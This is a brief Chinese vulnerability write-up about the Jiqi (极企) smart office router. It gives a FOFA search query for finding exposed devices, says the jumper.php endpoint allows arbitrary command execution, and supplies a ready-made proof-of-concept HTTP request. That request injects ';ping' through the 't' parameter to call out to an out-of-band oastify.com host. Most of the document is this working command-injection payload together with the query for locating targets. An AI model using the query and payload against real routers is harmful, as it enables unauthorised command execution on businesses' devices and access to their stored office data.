**fofa**

```
title="极企智能办公路由"
```

**一、漏洞简述**

极企办公路由全新定义办公场景路由，服务于小微企业，除了强大WiFi 覆盖功能外，同时可以满足企业考勤管理的各项需求（wifi自动打卡、手机打卡、考勤统计、智能排班等）；同时内嵌一套完善的迷你办公系统，具有日常审批、通知公告、通讯录、企业文档内部云盘等多项功能；内置的8G储存容量，打造本地存储且部署在公司的防火墙内，可容纳单据、档案、客户信息等多种办公数据。此外还有顶级外网穿透技术和办公软件应用商店及入口，不断上新企业应用，丰富和完善企业的使用体验。其接口jumper.php存在任意命令执行漏洞，攻击者可通过该漏洞获取系统权限。

**二、漏洞检测poc**

```yaml
GET /notice/jumper.php?t=;ping%20-c%201%20999.xxykpjfgplr5pol5va17v24wange45su.oastify.com HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close


```

